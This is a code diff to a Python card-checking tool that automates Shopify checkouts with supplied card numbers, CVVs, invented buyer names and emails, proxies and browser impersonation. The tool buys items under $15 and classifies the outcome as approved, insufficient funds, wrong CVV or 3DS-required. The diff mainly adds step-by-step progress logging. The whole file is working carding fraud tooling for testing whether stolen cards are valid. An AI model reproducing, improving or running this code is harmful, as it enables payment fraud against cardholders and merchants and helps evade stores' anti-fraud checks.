@@ -275,7 +275,7 @@ def get_address_for_country(country_code):
         addr["phone"] = random.choice(us_phones)
         return addr
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -290,34 +290,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
     email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
     
-    bin_country = await fetch_bin_country(cc, proxy_str)
-    billing_addr = get_address_for_country(bin_country)
-    shipping_addr = get_address_for_country("US")
-    
-    b_add1 = billing_addr["address1"]
-    b_city = billing_addr["city"]
-    b_state_short = billing_addr["zoneCode"]
-    b_zip_code = billing_addr["postalCode"]
-    b_phone = billing_addr["phone"]
-    b_country_code = billing_addr["countryCode"]
-    
-    s_add1 = shipping_addr["address1"]
-    s_city = shipping_addr["city"]
-    s_state_short = shipping_addr["zoneCode"]
-    s_zip_code = shipping_addr["postalCode"]
-    s_phone = shipping_addr["phone"]
-    s_country_code = shipping_addr["countryCode"]
-    
     try:
         # 1. Fetch cheapest product variant if not provided
         if not variant_id:
+            await queue.put({"type": "log", "msg": "[STEP 1] Fetching products from /products.json..."})
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple) and info[0] is False:
+                await queue.put({"type": "log", "msg": f"[ERROR STEP 1] {info[1]}"})
                 return False, info[1], gateway, total_price, currency
             
             try:
                 price_val = float(info['price'])
                 if price_val > 15.00:
+                    await queue.put({"type": "log", "msg": f"[ERROR STEP 1] Product too expensive: ${price_val:.2f}"})
                     return False, f"Site product too expensive: ${price_val:.2f}", gateway, info['price'], currency
             except Exception:
                 pass
@@ -325,6 +310,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             variant_id = info['variant_id']
             product_link = info['link']
             total_price = info['price']
+            await queue.put({"type": "log", "msg": f"[STEP 1 OK] Found product | Price: ${total_price}"})
         else:
             product_link = f"{ourl}/products/any"
             total_price = "0.01"
@@ -337,18 +323,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
         async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
             # Visit product page to set cookies
+            await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & initializing cart..."})
             try:
                 await session.get(product_link, headers=product_headers)
-            except Exception:
-                pass
-
-            # Hit /cart.js to initialize session
-            try:
                 await session.get(f"{ourl}/cart.js", headers=product_headers)
-            except Exception:
-                pass
+                await queue.put({"type": "log", "msg": "[STEP 2 OK] Cookies dropped successfully."})
+            except Exception as e:
+                await queue.put({"type": "log", "msg": f"[WARN STEP 2] Error visiting page: {str(e)[:50]}"})
 
             # Add cheapest item to cart
+            await queue.put({"type": "log", "msg": f"[STEP 3] Adding variant {variant_id} to cart..."})
             add_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -358,9 +342,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             try:
                 resp = await session.post(f"{ourl}/cart/add.js", headers=add_headers, data=add_data)
                 if resp.status_code != 200:
+                    await queue.put({"type": "log", "msg": f"[WARN STEP 3] Add.js returned {resp.status_code}, trying JSON method..."})
                     json_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                     await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
+                await queue.put({"type": "log", "msg": "[STEP 3 OK] Item added to cart successfully."})
             except Exception as e:
+                await queue.put({"type": "log", "msg": f"[ERROR STEP 3] Cart addition failed: {str(e)}"})
                 return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency
 
             # Get cart token from /cart.js
@@ -374,6 +361,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 pass
 
             # Trigger checkout redirect
+            await queue.put({"type": "log", "msg": "[STEP 4] Triggering checkout flow..."})
             checkout_headers = {
                 **product_headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -384,24 +372,20 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             try:
                 await session.get(f"{ourl}/checkout", headers=checkout_headers)
-            except Exception:
-                pass
-
-            checkout_data = {
-                'checkout': '',
-                'updates[]': '1'
-            }
-            try:
-                resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data=checkout_data, allow_redirects=True)
+                resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                 checkout_url = str(resp.url)
                 text = resp.text
+                await queue.put({"type": "log", "msg": "[STEP 4 OK] Checkout URL acquired."})
             except Exception as e:
+                await queue.put({"type": "log", "msg": f"[ERROR STEP 4] Checkout redirect failed: {str(e)}"})
                 return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency
 
             if 'login' in checkout_url.lower():
+                await queue.put({"type": "log", "msg": "[ERROR STEP 4] Site requires login!"})
                 return False, "Site requires login!", gateway, total_price, currency
 
             # Extract checkout and session tokens
+            await queue.put({"type": "log", "msg": "[STEP 5] Extracting Session Token (SST)..."})
             sst = None
             sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
             if sst_match:
@@ -416,7 +400,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                           extract_between(text, '"sessionToken":"', '"')
 
             if not sst:
+                await queue.put({"type": "log", "msg": "[ERROR STEP 5] Failed to get session token (Maybe Captcha/Block)."})
                 return False, "Failed to get session token", gateway, total_price, currency
+            
+            await queue.put({"type": "log", "msg": f"[STEP 5 OK] SST Extracted: {sst[:30]}..."})
 
             # Extract queueToken, stableId, paymentMethodIdentifier
             queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
@@ -437,6 +424,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 c_token = cart_token or "1"
 
             # 2. Tokenize card at deposit.us.shopifycs.com/sessions
+            await queue.put({"type": "log", "msg": "[STEP 6] Tokenizing card at shopifycs.com..."})
             session_endpoints = [
                 "https://deposit.us.shopifycs.com/sessions",
                 "https://checkout.pci.shopifyinc.com/sessions",
@@ -448,6 +436,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             token_error = "Unable to get payment token"
             for endpoint in session_endpoints:
                 try:
+                    await queue.put({"type": "log", "msg": f"          -> Trying: {endpoint}"})
                     payload = {
                         "credit_card": {
                             "number": cc.replace(" ", ""),
@@ -472,16 +461,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         token_data = token_resp.json()
                         sessionid = token_data.get('id')
                         if sessionid:
+                            await queue.put({"type": "log", "msg": f"[STEP 6 OK] Card Tokenized! ID: {sessionid[:20]}..."})
                             break
                     else:
-                        token_error = f"Status {token_resp.status_code}: {resp_body}"
+                        token_error = f"Status {token_resp.status_code}: {resp_body[:80]}"
                 except Exception as e:
                     token_error = str(e)
 
             if not sessionid:
+                await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
             # 3. Submit GraphQL payment directly
+            await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
             graphql_headers = {
                 'Accept': 'application/json',
@@ -658,24 +650,35 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             for submit_attempt in range(2):
                 try:
                     graphql_resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload, timeout=15)
+                    await queue.put({"type": "log", "msg": f"          -> GraphQL HTTP Status: {graphql_resp.status_code}"})
+                    
                     if graphql_resp.status_code != 200:
                         if submit_attempt == 0:
+                            await queue.put({"type": "log", "msg": "          -> Retrying in 2s..."})
                             await asyncio.sleep(2)
                             continue
+                        await queue.put({"type": "log", "msg": "[ERROR STEP 7] GraphQL submission failed."})
                         return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                     
                     result_data = graphql_resp.json()
                     completion = result_data.get('data', {}).get('submitForCompletion', {})
+                    typename = completion.get('__typename')
+                    await queue.put({"type": "log", "msg": f"          -> GraphQL Typename: {typename}"})
                     
-                    if completion.get('__typename') == 'CheckpointDenied':
+                    if typename == 'CheckpointDenied':
+                        await queue.put({"type": "log", "msg": "[ERROR STEP 7] Checkpoint Denied (Captcha/Security)."})
                         return True, "CARD_DECLINED", gateway, total_price, currency
                         
                     if completion.get('receipt'):
                         receipt_id = completion['receipt'].get('id')
+                        await queue.put({"type": "log", "msg": f"[STEP 7 OK] Receipt ID Captured: {receipt_id}"})
                     
                     if completion.get('errors'):
                         errors = completion['errors']
                         error_codes = [e.get('code') for e in errors if 'code' in e]
+                        error_msgs = [e.get('localizedMessage', '') for e in errors if 'localizedMessage' in e]
+                        
+                        await queue.put({"type": "log", "msg": f"          -> Gateway Errors: {error_codes} | Msgs: {error_msgs}"})
                         
                         soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                         only_soft_errors = all(code in soft_errors for code in error_codes)
@@ -685,9 +688,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         
                         non_soft_errors = [code for code in error_codes if code not in soft_errors]
                         if non_soft_errors:
+                            await queue.put({"type": "log", "msg": f"[FAILED STEP 7] Hard errors returned from gateway."})
                             return True, ', '.join(non_soft_errors), gateway, total_price, currency
                     
                     if completion.get('reason'):
+                        await queue.put({"type": "log", "msg": f"[FAILED STEP 7] Submit reason: {completion.get('reason')}"})
                         return True, completion['reason'], gateway, total_price, currency
                     
                     break
@@ -695,10 +700,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     if submit_attempt == 0:
                         await asyncio.sleep(2)
                         continue
+                    await queue.put({"type": "log", "msg": f"[ERROR STEP 7] Exception: {str(e)}"})
                     return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency
 
             # 4. Poll for receipt status
             if receipt_id:
+                await queue.put({"type": "log", "msg": "[STEP 8] Polling for receipt status (Waiting bank response)..."})
                 poll_payload = {
                     'query': QUERY_POLL,
                     'variables': {
@@ -710,26 +717,33 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 
                 for poll_attempt in range(6):
                     await asyncio.sleep(3)
+                    await queue.put({"type": "log", "msg": f"          -> Polling attempt {poll_attempt + 1}/6..."})
                     try:
                         poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload, timeout=7)
                         if poll_resp.status_code == 200:
                             poll_data = poll_resp.json()
                             receipt = poll_data.get('data', {}).get('receipt', {})
                             typename = receipt.get('__typename')
+                            await queue.put({"type": "log", "msg": f"          -> Bank Status: {typename}"})
                             
                             if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
+                                await queue.put({"type": "log", "msg": "[SUCCESS] BANK APPROVED! ORDER PLACED!"})
                                 return True, "ORDER_PLACED", gateway, total_price, currency
                             elif typename == 'ActionRequiredReceipt':
+                                await queue.put({"type": "log", "msg": "[WARN] 3DS/OTP Triggered by bank."})
                                 return True, "OTP_REQUIRED", gateway, total_price, currency
                             elif typename == 'FailedReceipt':
-                                code = receipt.get('processingError', {}).get('code') or \
-                                       receipt.get('processingError', {}).get('messageUntranslated') or \
-                                       "CARD_DECLINED"
-                                return True, code, gateway, total_price, currency
+                                code = receipt.get('processingError', {}).get('code') or "UNKNOWN_CODE"
+                                msg = receipt.get('processingError', {}).get('messageUntranslated') or "No message"
+                                await queue.put({"type": "log", "msg": f"[FAILED] Bank Rejected: {code} - {msg}"})
+                                return True, f"FAILED_RECEIPT | Code: {code} | Msg: {msg}", gateway, total_price, currency
                     except Exception:
                         pass
+            else:
+                await queue.put({"type": "log", "msg": "[WARN STEP 8] No Receipt ID to poll."})
 
             # 5. Fallback final check
+            await queue.put({"type": "log", "msg": "[STEP 9] Running fallback HTML check..."})
             try:
                 checkout_url_final = f"{ourl}/checkout?from_processing_page=1&validate=true"
                 final_resp = await session.get(checkout_url_final, headers=product_headers, timeout=10)
@@ -737,10 +751,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 final_text = final_resp.text
                 
                 if "/thank" in final_url.lower() or "/orders/" in final_url:
+                    await queue.put({"type": "log", "msg": "[SUCCESS] FALLBACK CAUGHT ORDER PLACED!"})
                     return True, "ORDER_PLACED", gateway, total_price, currency
                 
                 final_lower = final_text.lower()
                 if "challenge" in final_url.lower() or "challenge" in final_lower or "recaptcha" in final_lower or "hcaptcha" in final_lower:
+                    await queue.put({"type": "log", "msg": "[FAILED] Captcha/Challenge detected in fallback."})
                     return True, "CARD_DECLINED", gateway, total_price, currency
                 
                 is_3ds = (
@@ -752,20 +768,27 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 )
                 
                 if "insufficient funds" in final_lower or "insufficient_funds" in final_lower:
+                    await queue.put({"type": "log", "msg": "[FAILED] Fallback caught: Insufficient Funds."})
                     return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                 elif "security code is incorrect" in final_lower or "cvv_gateway_error" in final_lower or "incorrect cvv" in final_lower:
+                    await queue.put({"type": "log", "msg": "[FAILED] Fallback caught: Incorrect CVV."})
                     return True, "INCORRECT_CVC", gateway, total_price, currency
                 elif is_3ds:
+                    await queue.put({"type": "log", "msg": "[WARN] Fallback caught: 3DS Required."})
                     return True, "OTP_REQUIRED", gateway, total_price, currency
                 elif "declined" in final_lower or "failed" in final_lower:
                     code = extract_between(final_text, '{"code":"', '"')
-                    return True, code if code else "CARD_DECLINED", gateway, total_price, currency
-            except Exception:
-                pass
+                    msg = code if code else "CARD_DECLINED"
+                    await queue.put({"type": "log", "msg": f"[FAILED] Fallback caught: {msg}"})
+                    return True, msg, gateway, total_price, currency
+            except Exception as e:
+                 await queue.put({"type": "log", "msg": f"[WARN STEP 9] Fallback failed: {str(e)[:50]}"})
 
+            await queue.put({"type": "log", "msg": "[FAILED] Process completed but no clear approval. Defaulting to Declined."})
             return True, "CARD_DECLINED", gateway, total_price, currency
 
     except Exception as e:
+        await queue.put({"type": "log", "msg": f"[FATAL ERROR] {str(e)}"})
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 
 def _classify_response(response_text: str) -> tuple:
